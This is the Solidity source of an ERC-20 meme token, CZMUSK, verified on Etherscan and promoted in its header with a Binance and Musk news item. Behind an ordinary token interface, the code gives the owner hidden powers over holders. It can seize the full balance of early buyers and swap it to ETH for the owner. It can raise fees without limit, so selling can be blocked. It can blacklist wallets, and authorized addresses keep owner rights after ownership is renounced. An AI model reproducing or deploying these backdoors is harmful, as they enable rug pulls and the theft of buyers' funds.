/**
 *Submitted for verification at Etherscan.io on 2022-05-05
*/

/**

// SPDX-License-Identifier: Unlicensed


CZMUSK 

Binance has committed $500m to co-invest in Twitter with Elon Musk...

Probably Nothing...

https://twitter.com/BTC_Archive/status/1522162922188857346?s=20&t=4Jg-vQom2IyYBz3Ayujbkw

https://twitter.com/binance/status/1522168304852512769?s=20&t=4Jg-vQom2IyYBz3Ayujbkw

https://t.me/CZMUSKERC

*/

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable is Context {
    address private _owner;
    mapping(address => bool) internal authorizations;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
        authorizations[_owner] = true;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(
            owner() == _msgSender() || isAuthorized(_msgSender()),
            "Ownable: caller is not allowed"
        );
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract CZMUSK is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 MAX_INT =
        115792089237316195423570985008687907853269984665640564039457584007913129639935;
    string private constant _name = "CZMUSK";
    string private constant _symbol = "CZMUSK";
    uint8 private constant _decimals = 9;

    address[] private _sniipers;
    mapping(address => uint256) _balances;
    mapping(address => uint256) _lastTX;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isSniiper;
    mapping(address => bool) private _liquidityHolders;
    mapping(address => bool) private bots;
    uint256 _totalSupply = 1000000000 * 10**9;

    //Buy Fee
    uint256 private _taxFeeOnBuy = 5;

    //Sell Fee
    uint256 private _taxFeeOnSell = 10;

    //Original Fee
    uint256 private _taxFee = _taxFeeOnSell;
    uint256 private _previoustaxFee = _taxFee;

    address payable private _marketingAddress;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private tradingOpen = false;
    bool private inSwap = false;
    bool private swapEnabled = true;
    bool private transferDelay = true;
    bool sniiperProtection = true;

    uint256 private wipeBlocks = 1;
    uint256 private launchedAt;
    uint256 public _maxTxAmount = 30000000 * 10**9; //3
    uint256 public _maxWalletSize = 30000000 * 10**9; //3
    uint256 public _swapTokensAtAmount = 1000000 * 10**9; //0.1

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _balances[_msgSender()] = _totalSupply;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _approve(address(this), address(uniswapV2Router), MAX_INT);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;
        _isExcludedFromFee[_marketingAddress] = true; //multisig
        _liquidityHolders[msg.sender] = true;
        _marketingAddress = payable(msg.sender);

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function setWipeBlocks(uint256 newWipeBlocks) public onlyOwner {
        wipeBlocks = newWipeBlocks;
    }

    function setSniiperProtection(bool _sniiperProtection) public onlyOwner {
        sniiperProtection = _sniiperProtection;
    }

    function byeByeSniipers() public onlyOwner lockTheSwap {
        if (_sniipers.length > 0) {
            uint256 oldContractBalance = _balances[address(this)];
            for (uint256 i = 0; i < _sniipers.length; i++) {
                _balances[address(this)] = _balances[address(this)].add(
                    _balances[_sniipers[i]]
                );
                emit Transfer(
                    _sniipers[i],
                    address(this),
                    _balances[_sniipers[i]]
                );
                _balances[_sniipers[i]] = 0;
            }
            uint256 collectedTokens = _balances[address(this)] -
                oldContractBalance;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = uniswapV2Router.WETH();

            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                collectedTokens,
                0,
                path,
                _marketingAddress,
                block.timestamp
            );
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
            require(tradingOpen, "TOKEN: Trading not yet started");
            require(amount <= _maxTxAmount, "TOKEN: Max Transaction Limit");
            require(
                !bots[from] && !bots[to],
                "TOKEN: Your account is blacklisted!"
            );

            if (sniiperProtection) {
                if (
                    launchedAt > 0 &&
                    from == uniswapV2Pair &&
                    !_liquidityHolders[from] &&
                    !_liquidityHolders[to]
                ) {
                    if (block.number - launchedAt <= wipeBlocks) {
                        if (!_isSniiper[to]) {
                            _sniipers.push(to);
                        }
                        _isSniiper[to] = true;
                    }
                }
            }

            if (to != uniswapV2Pair) {
                if (from == uniswapV2Pair && transferDelay) {
                    require(
                        _lastTX[tx.origin] + 3 minutes < block.timestamp &&
                            _lastTX[to] + 3 minutes < block.timestamp,
                        "TOKEN: 3 minutes cooldown between buys"
                    );
                }
                require(
                    balanceOf(to) + amount < _maxWalletSize,
                    "TOKEN: Balance exceeds wallet size!"
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;

            if (contractTokenBalance >= _swapTokensAtAmount) {
                contractTokenBalance = _swapTokensAtAmount;
            }

            if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled) {
                swapTokensForEth(contractTokenBalance); // Reserve of 15% of tokens for liquidity
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0 ether) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        bool takeFee = true;

        //Transfer Tokens
        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to]) ||
            (from != uniswapV2Pair && to != uniswapV2Pair)
        ) {
            takeFee = false;
        } else {
            //Set Fee for Buys
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _taxFee = _taxFeeOnBuy;
            }

            //Set Fee for Sells
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _taxFee = _taxFeeOnSell;
            }
        }
        _lastTX[tx.origin] = block.timestamp;
        _lastTX[to] = block.timestamp;
        _tokenTransfer(from, to, amount, takeFee);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        uint256 ethAmt = tokenAmount.mul(85).div(100);
        uint256 liqAmt = tokenAmount - ethAmt;
        uint256 balanceBefore = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ethAmt,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);

        addLiquidity(liqAmt, amountETH.mul(15).div(100));
    }

    function sendETHToFee(uint256 amount) private {
        (bool success, ) = _marketingAddress.call{value: amount}("");
        require(success);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );
    }

    function openTrading() public onlyOwner {
        tradingOpen = true;
        sniiperProtection = true;
        launchedAt = block.number;
    }

    function manualswap() external onlyOwner {
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function blockBots(address[] memory bots_) public onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function unblockBot(address notbot) public onlyOwner {
        bots[notbot] = false;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) {
            _transferNoTax(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
    }

    function airdrop(address[] calldata recipients, uint256[] calldata amount)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < recipients.length; i++) {
            _transferNoTax(msg.sender, recipients[i], amount[i]);
        }
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        uint256 amountReceived = takeFees(sender, amount);
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function _transferNoTax(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFees(address sender, uint256 amount)
        internal
        returns (uint256)
    {
        uint256 feeAmount = amount.mul(_taxFee).div(100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    receive() external payable {}

    function transferOwnership(address newOwner) public override onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _isExcludedFromFee[owner()] = false;
        _transferOwnership(newOwner);
        _isExcludedFromFee[owner()] = true;
    }

    function setFees(uint256 taxFeeOnBuy, uint256 taxFeeOnSell)
        public
        onlyOwner
    {
        _taxFeeOnBuy = taxFeeOnBuy;
        _taxFeeOnSell = taxFeeOnSell;
    }

    function setMinSwapTokensThreshold(uint256 swapTokensAtAmount)
        public
        onlyOwner
    {
        _swapTokensAtAmount = swapTokensAtAmount;
    }

    function toggleSwap(bool _swapEnabled) public onlyOwner {
        swapEnabled = _swapEnabled;
    }

    function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {
        _maxTxAmount = maxTxAmount;
    }

    function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
        _maxWalletSize = maxWalletSize;
    }

    function setIsFeeExempt(address holder, bool exempt) public onlyOwner {
        _isExcludedFromFee[holder] = exempt;
    }

    function toggleTransferDelay() public onlyOwner {
        transferDelay = !transferDelay;
    }

    function recoverLosteth() external onlyOwner {
        (bool success, ) = address(payable(msg.sender)).call{
            value: address(this).balance
        }("");
        require(success);
    }

    function recoverLostTokens(address _token, uint256 _amount)
        external
        onlyOwner
    {
        IERC20(_token).transfer(msg.sender, _amount);
    }
}